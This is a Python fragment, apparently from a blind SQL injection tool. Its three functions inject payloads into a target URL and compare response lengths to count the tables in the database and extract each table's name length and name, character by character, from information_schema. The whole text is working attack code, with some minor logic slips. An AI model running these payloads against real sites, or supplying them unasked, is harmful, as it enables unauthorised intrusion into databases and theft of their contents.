def Tno(DBName):

    Tno = 0
    url_temp = final_url + "' and (select count(table_name)a from information_schema.tables where table_schema = database() having a={0})%23"
    for i in range(0, MAX_Tnum):
        url = url_temp.format(i)
        response = requests.get(url)
        if len(response.text) == finalResponse_len:
            Tno = i;
            print("Table no:" , Tno)
            break
    if Tno == 0:
        if i == Tno - 1:
            print("Table no of database > MAX_Tname_len")
    return Tno

def Tname(Tnum, Tname_len):

    Tname = ""
    url_temp = final_url + "' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit {0},1),{1},1))={2}%23"   
    for i in range(1, Tname_len + 1):
        tempTname = Tname
        for char in chars:
            char_ascii = ord(char)
            url = url_temp.format(Tnum - 1, i, char_ascii)
            response = requests.get(url)
            if len(response.text) == finalResponse_len:
                Tname += char
                break           
        if tempTname == Tname:
            print("Few letters only.")
            exit()
    print("Table name is: " + Tname)
    return Tname
 
def Tname_len(Tnum):

    Tname_len = 0
    url_temp = final_url + "' and (select length(table_name) from information_schema.tables where table_schema = database() limit {0},1)={1}%23"
    for i in range(0, MAX_Tname_len):
        url = url_temp.format(Tnum - 1, i)
        response = requests.get(url)
        if len(response.text) == finalResponse_len:
            Tname_len = i
            break
    if Tname_len == 0:
        if i == MAX_Tname_len - 1:
            print("Tname_len > MAX_Tname_len")
    return Tname_len
 
